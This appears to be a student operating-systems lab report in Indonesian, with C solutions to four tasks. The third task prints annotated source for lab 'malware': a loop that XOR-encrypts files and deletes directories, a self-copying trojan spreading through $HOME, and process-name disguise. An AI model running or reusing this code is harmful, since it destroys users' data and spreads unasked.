```
===================== KELOMPOK IT22 =======================
Ananda Widi Alrafi 5027241067
Raynard Carlent 5027241109
Zahra Hafizhah 5027241121
===========================================================
```

#1 Soal no 1

Pada soal no 1 diberikan beberapa tahapan yang harus dilakukan yaitu :
1. Download dan ekstrak Clues.zip
2. Filter file yang hanya bernama `a.txt`, `1.txt`, dll
3. Gabungkan isi file dengan urutan angka-huruf ke Combined.txt
4. Decode ROT13 dari Combined.txt ke Decoded.txt



```c
int main(int argc, char *argv[]) {
    if (argc == 1) {
        download_and_extract();
    } else if (argc == 3 && strcmp(argv[1], "-m") == 0) {
        if (strcmp(argv[2], "Filter") == 0) {
            filter_files();
        } else if (strcmp(argv[2], "Combine") == 0) {
            combine_files();
        } else if (strcmp(argv[2], "Decode") == 0) {
            decode_combined();
        } else {
            fprintf(stderr, "Argumen tidak valid. Gunakan: ./action -m [Filter|Combine|Decode]\n");
        }
    } else {
        fprintf(stderr, "Usage:\n");
        fprintf(stderr, "./action               (download dan extract clue)\n");
        fprintf(stderr, "./action -m Filter     (filter file)\n");
        fprintf(stderr, "./action -m Combine    (gabungkan isi file)\n");
        fprintf(stderr, "./action -m Decode     (decode Rot13)\n");
    }

    return 0;
}
```
1. Bagian ini dibuat untuk membuat output yaitu menginstall file Clues.zip jika ./action tidak memiliki argumen
2. Bagian ini juga dibuat untuk melakukan filtering seperti yang ada di dalam code yaitu
   `./action -m Filter` `./action -m Combine` `./action m Decode`
3. Dan jika argumen tidak ada, maka akan memberikan output `fprintf(stderr, "Argumen tidak valid. Gunakan: ./action -m [Filter|Combine|Decode]\n");`

```c
void download_and_extract() {
    struct stat st = {0};
    if (stat("Clues", &st) == 0) {
        printf("Folder 'Clues' sudah ada. Skip download.\n");
        return;
    }

    printf("Downloading Clues.zip...\n");
    int dl = system("wget -O Clues.zip 'https://drive.google.com/uc?export=download&id=1xFn1OBJUuSdnApDseEczKhtNzyGekauK'");
    if (dl != 0) {
        printf("Gagal download Clues.zip\n");
        return;
    }

    printf("Unzipping Clues.zip...\n");
    int uz = system("unzip Clues.zip > /dev/null");
    if (uz != 0) {
        printf("Gagal unzip Clues.zip\n");
        return;
    }

    remove("Clues.zip");
    printf("Clues.zip berhasil di-download dan diekstrak!\n");
}

int is_valid_filename(const char *filename) {
    return strlen(filename) == 5 &&
        (isdigit(filename[0]) || isalpha(filename[0])) &&
        strcmp(filename + 1, ".txt") == 0;
}
```
1. Pada bagian ini akan memberikan beberapa output yaitu :
   - Pengecekan Folder Clues
   - Proses Download Clues.zip
   - Ekstraksi File Zip
   - Menghapus File Zip
   - Informasi Status
2. Fungsi is_valid_filename() bertugas untuk memvalidasi nama file apakah sesuai dengan kriteria yang diminta oleh soal, yaitu:
`Panjangnya harus 5 karakter (contoh a.txt, 1.txt), karakter pertama harus huruf atau angka, dan diikuti oleh file .txt`

```c
int is_valid_filename(const char *filename) {
    return strlen(filename) == 5 &&
        (isdigit(filename[0]) || isalpha(filename[0])) &&
        strcmp(filename + 1, ".txt") == 0;
}
```
1. File yang valid hanya yang namanya terdiri dari satu huruf atau satu angka diikuti dengan file .txt
- Contoh yang valid seperti berikut : `a.txt, 1.txt, z.txt, 5.txt`
- Contoh yang tidak valid seperti berikut :  `ab.txt, 01.txt, a.b.txt, 1a.txt, c.jpeg, x.doc`

```c
void filter_files() {
    DIR *d = opendir("Clues");
    if (!d) {
        perror("Folder Clues tidak ditemukan");
        return;
    }

    mkdir("Filtered", 0755);
    struct dirent *folder;
    while ((folder = readdir(d)) != NULL) {
        if (folder->d_type == DT_DIR && folder->d_name[0] != '.') {
            char subfolder_path[256];
            snprintf(subfolder_path, sizeof(subfolder_path), "Clues/%s", folder->d_name);
            DIR *sub = opendir(subfolder_path);
            if (!sub) continue;

            struct dirent *file;
            while ((file = readdir(sub)) != NULL) {
                if (file->d_type == DT_REG) {
                    char filepath[300];
                    snprintf(filepath, sizeof(filepath), "%s/%s", subfolder_path, file->d_name);

                    if (is_valid_filename(file->d_name)) {
                        char dest[300];
                        snprintf(dest, sizeof(dest), "Filtered/%s", file->d_name);
                        rename(filepath, dest);
                    } else {
                        remove(filepath);
                    }
                }
            }
            closedir(sub);
        }
    }
    closedir(d);
    printf("File berhasil difilter ke folder Filtered.\n");
}
```
Beberapa command line di atas memiliki beberapa fungsi yaitu : 
1. Membuka folder Clues/
2. Membuat folder Filtered/
3. Iterasi seluruh subfolder di dalam Clues/
4. Membuka setiap subfolder dan membaca file di dalamnya
5. Melakukan validasi nama file
6. Menutup semua folder yang telah dibuka
7. Menampilkan pesan bahwa proses filtering telah selesai

```c
void combine_files() {
    DIR *d = opendir("Filtered");
    if (!d) {
        perror("Folder Filtered tidak ditemukan");
        return;
    }

    char *numbers[100], *letters[100];
    int n = 0, l = 0;

    struct dirent *f;
    while ((f = readdir(d)) != NULL) {
        if (f->d_type == DT_REG) {
            if (isdigit(f->d_name[0])) numbers[n++] = strdup(f->d_name);
            else if (isalpha(f->d_name[0])) letters[l++] = strdup(f->d_name);
        }
    }
    closedir(d);

    qsort(numbers, n, sizeof(char *), compare);
    qsort(letters, l, sizeof(char *), compare);

    FILE *out = fopen("Combined.txt", "w");
    int max = n > l ? n : l;

    for (int i = 0; i < max; i++) {
        if (i < n) {
            char path[300];
            snprintf(path, sizeof(path), "Filtered/%s", numbers[i]);
            FILE *f = fopen(path, "r");
            if (f) {
                char c;
                while ((c = fgetc(f)) != EOF) fputc(c, out);
                fclose(f);
                remove(path);
            }
        }
        if (i < l) {
            char path[300];
            snprintf(path, sizeof(path), "Filtered/%s", letters[i]);
            FILE *f = fopen(path, "r");
            if (f) {
                char c;
                while ((c = fgetc(f)) != EOF) fputc(c, out);
                fclose(f);
                remove(path);
            }
        }
    }

    fclose(out);
    printf("Combined.txt berhasil dibuat.\n");
}
```
Beberapa command line di atas memiliki beberapa fungsi yaitu : 
1. Menggabungkan clue yang tersebar dalam file .txt menjadi satu kesatuan
2. Menyusun clue dengan urutan khusus (angka-huruf-angka-huruf) agar bisa didekode di tahap selanjutnya
3. Membersihkan `file .txt` setelah selesai diproses, menjaga folder `Filtered/` tetap kosong

Fungsi ini membuat clue lebih terstruktur dan siap untuk tahap decode ROT13 di fungsi berikutnya

```c
char rot13(char c) {
    if ('a' <= c && c <= 'z') return 'a' + (c - 'a' + 13) % 26;
    if ('A' <= c && c <= 'Z') return 'A' + (c - 'A' + 13) % 26;
    return c;
}

void decode_combined() {
    FILE *in = fopen("Combined.txt", "r");
    FILE *out = fopen("Decoded.txt", "w");

    if (!in || !out) {
        perror("Gagal membuka Combined.txt atau membuat Decoded.txt");
        return;
    }

    char c;
    while ((c = fgetc(in)) != EOF) {
        fputc(rot13(c), out);
    }

    fclose(in);
    fclose(out);
    printf("Decoded.txt berhasil dibuat dari Combined.txt (ROT13).\n");
}
```
Beberapa command line di atas memeliki beberapa fungsi yaitu : 
1. Mengambil hasil gabungan clue `(Combined.txt)`
2. Menerapkan metode ROT13 untuk mendekripsi teks
3. Menyimpan hasil dekripsi ke `Decoded.txt`

Berikut hasil output dari Decoded.txt : 

![Image](https://github.com/user-attachments/assets/dac58502-3c07-48d3-92ab-31a29f91a669)

#2 Soal no 2
Pada nomer 2, tugas utamanya adalah :
1. --decrypt → jalanin daemon buat decode nama file base64.
2. --quarantine → pindahin file dari starter_kit ke quarantine.
3. --return → balikkan file dari quarantine ke starter_kit.
4. --eradicate → hapus semua file di quarantine.
5. --shutdown → matikan daemon decrypt lewat PID.
6. Logging semua aksi ke activity.log.

   Code :
 ```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dirent.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <fcntl.h>
#include <time.h>
#include <signal.h>
#include <errno.h>
#include <stdarg.h>
#include <linux/limits.h>

#define DOWNLOAD_URL "https://drive.usercontent.google.com/u/0/uc?id=1_5GxIGfQr3mNKuavJbte_AoRkEQLXSKS&export=download"
#define ZIP_FILE "starterkit.zip"
#define LOG_FILE "activity.log"
#define STARTER_KIT_DIR "starter_kit"
#define QUARANTINE_DIR "quarantine"
#define DAEMON_PID_FILE "/tmp/decrypt_daemon.pid"

// Function to write log entry
void write_log(const char *format, ...) {
    FILE *log_file = fopen(LOG_FILE, "a");
    if (!log_file) {
        perror("Error opening log file");
        return;
    }

    // Get current time
    time_t now = time(NULL);
    struct tm *time_info = localtime(&now);
    
    // Format timestamp explicitly to avoid locale issues
    fprintf(log_file, "[%02d-%02d-%04d][%02d:%02d:%02d] - ", 
            time_info->tm_mday, 
            time_info->tm_mon + 1, 
            time_info->tm_year + 1900,
            time_info->tm_hour,
            time_info->tm_min,
            time_info->tm_sec);

    // Handle variable arguments
    va_list args;
    va_start(args, format);
    vfprintf(log_file, format, args);
    va_end(args);

    fprintf(log_file, "\n");
    fclose(log_file);
}

// Function to check if directory exists
int directory_exists(const char *path) {
    struct stat st;
    return (stat(path, &st) == 0 && S_ISDIR(st.st_mode));
}

// Function to create directory if it doesn't exist
void create_directory_if_not_exists(const char *path) {
    if (!directory_exists(path)) {
        if (mkdir(path, 0755) != 0) {
            perror("Error creating directory");
            exit(EXIT_FAILURE);
        }
    }
}

// Function to download and extract starter kit
void download_and_extract() {
    // Check if STARTER_KIT_DIR already exists
    if (directory_exists(STARTER_KIT_DIR)) {
        printf("Starter kit directory already exists. Skipping download.\n");
        return;
    }

    // Download the zip file using curl
    pid_t pid = fork();
    if (pid == 0) {
        // Child process
        execl("/usr/bin/curl", "curl", "-L", "-o", ZIP_FILE, DOWNLOAD_URL, NULL);
        perror("execl curl failed");
        exit(EXIT_FAILURE);
    } else if (pid > 0) {
        // Parent process
        int status;
        waitpid(pid, &status, 0);
        if (WIFEXITED(status) && WEXITSTATUS(status) != 0) {
            fprintf(stderr, "Error downloading file\n");
            exit(EXIT_FAILURE);
        }
    } else {
        perror("fork failed");
        exit(EXIT_FAILURE);
    }

    // Create the starter kit directory
    create_directory_if_not_exists(STARTER_KIT_DIR);

    // Unzip the file
    pid = fork();
    if (pid == 0) {
        // Child process
        execl("/usr/bin/unzip", "unzip", ZIP_FILE, "-d", STARTER_KIT_DIR, NULL);
        perror("execl unzip failed");
        exit(EXIT_FAILURE);
    } else if (pid > 0) {
        // Parent process
        int status;
        waitpid(pid, &status, 0);
        if (WIFEXITED(status) && WEXITSTATUS(status) != 0) {
            fprintf(stderr, "Error extracting file\n");
            exit(EXIT_FAILURE);
        }
    } else {
        perror("fork failed");
        exit(EXIT_FAILURE);
    }

    // Remove the zip file
    if (unlink(ZIP_FILE) != 0) {
        perror("Error removing zip file");
    }

    printf("Successfully downloaded and extracted starter kit\n");
}

// Base64 decoding functions
static const unsigned char base64_table[65] =
    "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

static const unsigned char base64_reverse_table[256] = {
    0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,
    0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,
    0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0, 62,  0,  0,  0, 63,
    52, 53, 54, 55, 56, 57, 58, 59, 60, 61,  0,  0,  0,  0,  0,  0,
    0,  0,  1,  2,  3,  4,  5,  6,  7,  8,  9, 10, 11, 12, 13, 14,
    15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25,  0,  0,  0,  0,  0,
    0, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40,
    41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51,  0,  0,  0,  0,  0,
    0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,
    0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,
    0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,
    0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,
    0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,
    0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,
    0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,
    0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0
};

// Function to decode Base64 string
char* base64_decode(const char *src, size_t *out_len) {
    size_t src_len = strlen(src);
    size_t target_len = src_len / 4 * 3;
    char *target = malloc(target_len + 1);
    if (!target)
        return NULL;

    size_t i, j;
    for (i = 0, j = 0; i < src_len; i += 4, j += 3) {
        unsigned char a = base64_reverse_table[(unsigned char)src[i]];
        unsigned char b = (i + 1 < src_len) ? base64_reverse_table[(unsigned char)src[i + 1]] : 0;
        unsigned char c = (i + 2 < src_len) ? base64_reverse_table[(unsigned char)src[i + 2]] : 0;
        unsigned char d = (i + 3 < src_len) ? base64_reverse_table[(unsigned char)src[i + 3]] : 0;

        target[j] = (a << 2) | (b >> 4);
        if (i + 2 < src_len)
            target[j + 1] = (b << 4) | (c >> 2);
        if (i + 3 < src_len)
            target[j + 2] = (c << 6) | d;
    }

    *out_len = j;
    target[j] = '\0';
    return target;
}

// Function to check if a string is Base64 encoded
int is_base64_encoded(const char *str) {
    size_t len = strlen(str);
    
    // Basic check: Base64 strings have a length that's a multiple of 4
    if (len % 4 != 0) return 0;
    
    // Check each character is in the Base64 alphabet
    for (size_t i = 0; i < len; i++) {
        if (!((str[i] >= 'A' && str[i] <= 'Z') ||
              (str[i] >= 'a' && str[i] <= 'z') ||
              (str[i] >= '0' && str[i] <= '9') ||
              str[i] == '+' || str[i] == '/' ||
              (i >= len - 2 && str[i] == '='))) {
            return 0;
        }
    }
    
    return 1;
}

// Function to read daemon PID from file
pid_t read_daemon_pid() {
    FILE *pid_file = fopen(DAEMON_PID_FILE, "r");
    if (!pid_file) {
        return -1;  // PID file doesn't exist or can't be read
    }

    pid_t pid;
    if (fscanf(pid_file, "%d", &pid) != 1) {
        fclose(pid_file);
        return -1;  // Failed to read PID
    }

    fclose(pid_file);
    return pid;
}

// Function to write daemon PID to file
void write_daemon_pid(pid_t pid) {
    FILE *pid_file = fopen(DAEMON_PID_FILE, "w");
    if (!pid_file) {
        perror("Failed to create PID file");
        exit(EXIT_FAILURE);
    }

    fprintf(pid_file, "%d", pid);
    fclose(pid_file);
}

// Function to start daemon that decrypts Base64 filenames
void start_decrypt_daemon() {
    // Check if daemon is already running
    if (read_daemon_pid() > 0) {
        printf("Decrypt daemon is already running\n");
        return;
    }

    // Create quarantine directory if it doesn't exist
    create_directory_if_not_exists(QUARANTINE_DIR);

    pid_t pid = fork();
    if (pid < 0) {
        perror("Fork failed");
        exit(EXIT_FAILURE);
    } else if (pid > 0) {
        // Parent process
        printf("Started decryption daemon with PID %d\n", pid);
        write_daemon_pid(pid);
        write_log("Successfully started decryption process with PID %d.", pid);
        return;
    }

    // Child process becomes daemon
    // Create a new session to detach from terminal
    if (setsid() < 0) {
        perror("setsid failed");
        exit(EXIT_FAILURE);
    }

    // Change working directory to root
    if (chdir("/") < 0) {
        perror("chdir failed");
        exit(EXIT_FAILURE);
    }

    // Close standard file descriptors
    close(STDIN_FILENO);
    close(STDOUT_FILENO);
    close(STDERR_FILENO);

    // Redirect to /dev/null
    open("/dev/null", O_RDONLY);
    open("/dev/null", O_WRONLY);
    open("/dev/null", O_WRONLY);

    // Main daemon loop
    while (1) {
        DIR *dir = opendir(QUARANTINE_DIR);
        if (!dir) {
            sleep(5);
            continue;
        }

        struct dirent *entry;
        while ((entry = readdir(dir)) != NULL) {
            if (entry->d_type == DT_REG && is_base64_encoded(entry->d_name)) {
                // Decode the filename
                size_t decoded_len;
                char *decoded_name = base64_decode(entry->d_name, &decoded_len);
                if (!decoded_name)
                    continue;

                // Build old and new paths
                char old_path[PATH_MAX];
                char new_path[PATH_MAX];
                snprintf(old_path, PATH_MAX, "%s/%s", QUARANTINE_DIR, entry->d_name);
                snprintf(new_path, PATH_MAX, "%s/%s", QUARANTINE_DIR, decoded_name);

                // Rename the file
                if (rename(old_path, new_path) == 0) {
                    // Successfully renamed
                }

                free(decoded_name);
            }
        }

        closedir(dir);
        sleep(5);  // Sleep for 5 seconds before checking again
    }

    // Should never reach here
    exit(EXIT_SUCCESS);
}

// Function to stop daemon
void stop_decrypt_daemon() {
    pid_t daemon_pid = read_daemon_pid();
    if (daemon_pid <= 0) {
        printf("Decrypt daemon is not running\n");
        return;
    }

    // Send SIGTERM to the daemon
    if (kill(daemon_pid, SIGTERM) == 0) {
        printf("Sent shutdown signal to decrypt daemon (PID: %d)\n", daemon_pid);
        write_log("Successfully shut off decryption process with PID %d.", daemon_pid);
        
        // Remove PID file
        if (unlink(DAEMON_PID_FILE) != 0) {
            perror("Failed to remove PID file");
        }
    } else {
        perror("Failed to send signal to daemon");
    }
}

// Function to move file between directories
void move_file(const char *src_dir, const char *dst_dir, const char *filename) {
    char src_path[PATH_MAX];
    char dst_path[PATH_MAX];
    
    snprintf(src_path, PATH_MAX, "%s/%s", src_dir, filename);
    snprintf(dst_path, PATH_MAX, "%s/%s", dst_dir, filename);
    
    if (rename(src_path, dst_path) == 0) {
        printf("Moved %s from %s to %s\n", filename, src_dir, dst_dir);
        if (strcmp(dst_dir, QUARANTINE_DIR) == 0) {
            write_log("%s - Successfully moved to quarantine directory.", filename);
        } else if (strcmp(dst_dir, STARTER_KIT_DIR) == 0) {
            write_log("%s - Successfully returned to starter kit directory.", filename);
        }
    } else {
        perror("Error moving file");
    }
}

// Function to move files from starter kit to quarantine
void quarantine_files() {
    DIR *dir = opendir(STARTER_KIT_DIR);
    if (!dir) {
        perror("Error opening starter kit directory");
        return;
    }

    create_directory_if_not_exists(QUARANTINE_DIR);

    struct dirent *entry;
    while ((entry = readdir(dir)) != NULL) {
        if (entry->d_type == DT_REG) {
            move_file(STARTER_KIT_DIR, QUARANTINE_DIR, entry->d_name);
        }
    }

    closedir(dir);
}

// Function to move files from quarantine to starter kit
void return_files() {
    DIR *dir = opendir(QUARANTINE_DIR);
    if (!dir) {
        perror("Error opening quarantine directory");
        return;
    }

    create_directory_if_not_exists(STARTER_KIT_DIR);

    struct dirent *entry;
    while ((entry = readdir(dir)) != NULL) {
        if (entry->d_type == DT_REG) {
            move_file(QUARANTINE_DIR, STARTER_KIT_DIR, entry->d_name);
        }
    }

    closedir(dir);
}

// Function to eradicate (delete) files in quarantine
void eradicate_files() {
    DIR *dir = opendir(QUARANTINE_DIR);
    if (!dir) {
        perror("Error opening quarantine directory");
        return;
    }

    struct dirent *entry;
    while ((entry = readdir(dir)) != NULL) {
        if (entry->d_type == DT_REG) {
            char path[PATH_MAX];
            snprintf(path, PATH_MAX, "%s/%s", QUARANTINE_DIR, entry->d_name);
            
            if (unlink(path) == 0) {
                printf("Deleted %s\n", entry->d_name);
                write_log("%s - Successfully deleted.", entry->d_name);
            } else {
                perror("Error deleting file");
            }
        }
    }

    closedir(dir);
}

// Function to display usage information
void display_usage() {
    printf("Usage: ./starterkit [OPTION]\n");
    printf("Options:\n");
    printf("  --decrypt     Start the decryption daemon\n");
    printf("  --quarantine  Move files from starter kit to quarantine\n");
    printf("  --return      Move files from quarantine to starter kit\n");
    printf("  --eradicate   Delete all files in quarantine\n");
    printf("  --shutdown    Stop the decryption daemon\n");
}

int main(int argc, char *argv[]) {
    // Create log file if it doesn't exist
    FILE *log_file = fopen(LOG_FILE, "a");
    if (log_file) {
        fclose(log_file);
    } else {
        perror("Error creating log file");
    }

    // If no arguments, download and extract starter kit
    if (argc == 1) {
        download_and_extract();
        return 0;
    }

    // Handle command line arguments
    if (argc == 2) {
        if (strcmp(argv[1], "--decrypt") == 0) {
            start_decrypt_daemon();
        } else if (strcmp(argv[1], "--quarantine") == 0) {
            quarantine_files();
        } else if (strcmp(argv[1], "--return") == 0) {
            return_files();
        } else if (strcmp(argv[1], "--eradicate") == 0) {
            eradicate_files();
        } else if (strcmp(argv[1], "--shutdown") == 0) {
            stop_decrypt_daemon();
        } else {
            display_usage();
            return 1;
        }
    } else {
        display_usage();
        return 1;
    }

    return 0;
}
```
Di akhir, bisa di cek di activity.log dengan hasil berikut :
![Image](https://github.com/user-attachments/assets/d75484e9-88dc-4faa-bb3a-b9d89e27ab09)


#3 Soal no 3

Untuk soal nomor 3 ini, kita diminta untuk membuat malware. Berikut penjelasan codingannya :

1. main
```c
int main(int argc, char *argv[]) {
    daemonize(argv[0]);

    int child_count = 3;
    spawn_process(argv[0], "wannacryptor", wannacryptor, NULL);
    spawn_process(argv[0], "trojan.wrm", trojan, NULL);
    spawn_process(argv[0], "rodok.exe", rodok, NULL);

    int status;
    for (int i = 0; i < child_count; i++) wait(&status);

    return 0;
}
```
Fungsi ini adalah titik awal program. Ia memanggil daemonize() untuk mengubah proses menjadi daemon. Kemudian, menjalankan tiga proses anak (wannacryptor, trojan.wrm, dan rodok.exe) menggunakan spawn_process(), yang masing-masing menjalankan fungsi berbeda. Setelah spawn, main() menunggu semua proses anak selesai dengan wait().

2. daemonize
 ```c
void daemonize(char *argv0) {
    prctl(PR_SET_NAME, "/init", 0, 0, 0);
    strncpy(argv0, "/init", 128);

    pid_t pid = fork();
    if (pid < 0) exit(1);
    if (pid > 0) exit(0);
    if (setsid() < 0) exit(1);
    umask(0);
    for (int x = sysconf(_SC_OPEN_MAX); x > 0; x--) close(x);
}
```
Fungsi ini menjadikan proses utama sebagai daemon: mengganti nama proses menjadi "/init" (nama umum proses sistem), melakukan fork agar bisa lepas dari terminal, membuat session baru dengan setsid(), mengatur umask ke nol, dan menutup semua file descriptor.

3. spawn_process
 ```c
void spawn_process(char *argv0, char processName[], int (*callback)(char *argv0, char *args[]), char *args[]) {
    pid_t pid = fork();
    if (pid < 0 || pid > 0) return;

    prctl(PR_SET_PDEATHSIG, SIGTERM);
    prctl(PR_SET_NAME, processName, 0, 0, 0);
    strncpy(argv0, processName, 128);
    exit(callback(argv0, args));
}
```
Fungsi ini membuat proses anak dengan nama proses khusus. Setelah fork, proses anak akan menjalankan fungsi callback (misalnya wannacryptor) dengan nama proses yang disamarkan menggunakan prctl().

4. wannacryptor
 ```c
int wannacryptor() {
    while (1) {
        DIR *dir = opendir(".");
        if (!dir) return 1;

        time_t timestamp = time(NULL);
        struct dirent *entry;

        while ((entry = readdir(dir)) != NULL) {
            if (entry->d_name[0] == '.' || entry->d_name == "runme") continue;
            if (entry->d_type == DT_REG) xor_file(entry->d_name, timestamp);
            if (entry->d_type == DT_DIR) {
                char zipname[PATH_MAX];
                snprintf(zipname, sizeof(zipname), "%s.zip", entry->d_name);

                char *zip_args[] = {"zip", "-qr", zipname, entry->d_name, NULL};
                run_command("/bin/zip", zip_args);

                xor_file(zipname, timestamp);

                char *rm_args[] = {"rm", "-rf", entry->d_name, NULL};
                run_command("/bin/rm", rm_args);
            }
        }

        closedir(dir);
        sleep(30);
    }
    return 0;
}
```
Fungsi ini mencari file dan direktori di direktori saat ini (.). File biasa akan dienkripsi dengan XOR, sedangkan direktori akan di-zip, kemudian hasil zip-nya dienkripsi, dan direktori aslinya dihapus. Proses ini diulang terus-menerus setiap 30 detik.

5. xor_file
 ```c
int xor_file(const char *filename, time_t timestamp) {
    FILE *file = NULL;
    unsigned char *file_buffer = NULL, *key = NULL;
    size_t key_length, file_size, i;
    int ret = 1;

    key = malloc(32);
    if (!key) goto cleanup;
    snprintf((char *)key, 32, "%ld", timestamp);
    key_length = strlen((char *)key);

    file = fopen(filename, "rb+");
    if (!file) goto cleanup;

    fseek(file, 0, SEEK_END);
    file_size = ftell(file);
    rewind(file);

    file_buffer = malloc(file_size);
    if (!file_buffer) goto cleanup;
    if (fread(file_buffer, 1, file_size, file) != file_size) goto cleanup;
    for (i = 0; i < file_size; i++) file_buffer[i] ^= key[i % key_length];
    rewind(file);
    if (fwrite(file_buffer, 1, file_size, file) != file_size) goto cleanup;
    ret = 0;

cleanup:
    if (file) fclose(file);
    free(file_buffer);
    free(key);
    return ret;
}
```
Fungsi ini mengenkripsi file dengan metode XOR sederhana. Kunci dihasilkan dari timestamp saat fungsi dijalankan, dan digunakan berulang untuk mengenkripsi setiap byte file.

6. trojan
 ```c
int trojan() {
    char self[1024];
    ssize_t len = readlink("/proc/self/exe", self, sizeof(self) - 1);
    if (len == -1) return 1;
    self[len] = '\0';

    char *filename = basename(self);
    char *home = getenv("HOME");
    if (!home) {
        struct passwd *pw = getpwuid(getuid());
        if (pw) home = pw->pw_dir;
    }

    FILE *fp = fopen(self, "rb");
    if (!fp) {
        fclose(fp);
        return 1;
    }
    while (1) {
        cloneFile(home, filename, fp);
        sleep(30);
    }
    fclose(fp);
    return 0;
}
```
Fungsi ini membaca file executable dirinya sendiri dan menyebarkan salinan tersebut ke seluruh direktori dalam $HOME secara rekursif. Salinan dibuat dengan nama sama dan diberi permission executable.

7. cloneFile
 ```c
int cloneFile(char *baseDirpath, char *filename, FILE *file) {
    DIR *dir = opendir(baseDirpath);
    char path[PATH_MAX];

    if (!dir) return 1;

    snprintf(path, sizeof(path), "%s/%s", baseDirpath, filename);
    FILE *dest = fopen(path, "wb");
    if (!file || !dest) {
        closedir(dir);
        return 1;
    }
    char buffer[1024];
    size_t bytes;
    while ((bytes = fread(buffer, 1, sizeof(buffer), file)) > 0) {
        fwrite(buffer, 1, bytes, dest);
    }
    fclose(dest);
    chmod(path, 0755);

    struct dirent *entry;
    char newpath[PATH_MAX];
    while ((entry = readdir(dir)) != NULL) {
        if (entry->d_name[0] == '.') continue;
        if (entry->d_type == DT_REG) continue;
        if (entry->d_type == DT_DIR) {
            snprintf(newpath, sizeof(newpath), "%s/%s", baseDirpath, entry->d_name);
            cloneFile(newpath, filename, file);
        }
    }
    closedir(dir);
    return 0;
}
```
Fungsi ini menyalin file ke baseDirpath lalu memanggil dirinya sendiri secara rekursif untuk menyalin file ke semua subdirektori. Ini adalah bagian inti dari penyebaran trojan.

8. rodok dan mining
 ```c
int rodok(char *argv0, char *args[]) {
    int MAX_MINER = 10;
    pid_t pids[MAX_MINER];
    int status;

    char miner_name[128];
    char log_miner_name[64];
    for (int i = 1; i <= MAX_MINER; i++) {
        snprintf(miner_name, sizeof(miner_name), "mine-crafter-%d", i);
        snprintf(log_miner_name, sizeof(log_miner_name), "Miner %d", i);

        char *values[1] = {log_miner_name};
        spawn_process(argv0, miner_name, mining, values);
    }
    for (int i = 0; i < MAX_MINER; i++) wait(&status);
    return 0;
}

int mining(char *argv0, char *args[]) {
    while (1) {
        srand(time(NULL) + getpid());
        int sleep_time = rand() % 28 + 3;

        char random_hex[65];
        for (int i = 0; i < 64; i++) {
            int random_char = rand() % 16;
            random_hex[i] = (random_char < 10) ? ('0' + random_char) : ('a' + random_char - 10);
        }
        random_hex[64] = '\0';

        time_t now = time(NULL);
        struct tm *tm_info = localtime(&now);
        char datetime[32];
        strftime(datetime, sizeof(datetime), "%Y-%m-%d %H:%M:%S", tm_info);

        FILE *log = fopen("/tmp/.miner.log", "a");
        if (log) {
            fprintf(log, "[%s][%s] %s\n", datetime, args[0], random_hex);
            fclose(log);
        }
        sleep(sleep_time);
    }
    return 0;
}
```
rodok() akan menjalankan hingga 10 proses mining() dengan nama proses berbeda (mine-crafter-1 s/d mine-crafter-10). Masing-masing mining() akan terus menulis hash acak ke /tmp/.miner.log, berpura-pura sebagai proses mining.


#4 Soal no 4

Pada nomor 4, tugas utamanya adalah :
1. Menulis log berisi nama proses dan status (contoh: RUNNING atau FAILED) ke file debugmon.log.
2. Menampilkan daftar proses milik user tertentu.
3. Membunuh semua proses user yang tidak ada dalam daftar pengecualian, lalu mencatat proses yang dibunuh ke log.
4. Menulis ke log bahwa user "diizinkan" kembali menjalankan proses. Tidak menghidupkan proses secara nyata.
5. Menjalankan daemon yang terus menerus memantau proses user, lalu mencatat ke log bahwa proses-proses itu sedang berjalan.
6. Menghentikan daemon yang sedang berjalan berdasarkan PID yang disimpan.

1. define
 ```c
#define LOG_FILE "debugmon.log"
#define PID_FILE "debugmon.pid"
```
a. "debugmon.log" = Ini mendefinisikan nama file log yang digunakan untuk mencatat aktivitas proses yang dimonitor. Jadi, setiap kali debugmon mencatat informasi (misalnya proses yang sedang berjalan, proses yang dihentikan, dll), ia akan menulis ke dalam file ini. Fungsinya sebagai dokumentasi aktivitas, agar bisa diketahui proses apa saja yang berjalan atau digagalkan oleh debugmon.
b. "debugmon.pid" = Ini mendefinisikan nama file untuk menyimpan PID (Process ID) dari program debugmon saat berjalan sebagai daemon. Fungsinya agar program tahu PID dari dirinya sendiri saat berjalan di background, sehingga nantinya bisa dihentikan secara manual menggunakan perintah kill atau debugmon stop dan dicek apakah sudah berjalan atau belum

2. write_log
```c
void write_log(const char *process_name, const char *status) {
    FILE *log = fopen(LOG_FILE, "a");
    if (!log) return;
    time_t now = time(NULL);
    struct tm *t = localtime(&now);
    fprintf(log, "[%02d:%02d:%04d]-%02d:%02d:%02d_%s_%s\n",
            t->tm_mday, t->tm_mon + 1, t->tm_year + 1900,
            t->tm_hour, t->tm_min, t->tm_sec,
            process_name, status);
    fclose(log);
}
```
Fungsi write_log digunakan untuk mencatat aktivitas proses ke dalam sebuah file log bernama debugmon.log. Fungsi ini menerima dua parameter: nama proses dan status proses tersebut (misalnya "RUNNING" atau "FAILED"). Dengan memanfaatkan fungsi waktu dari library time.h, write_log mencetak timestamp saat proses tercatat, disertai nama dan status proses. Format log disesuaikan agar mudah dibaca dan bisa digunakan untuk pelacakan riwayat aktivitas proses secara kronologis. Jika file log tidak bisa dibuka, fungsi akan langsung keluar tanpa melakukan apapun.

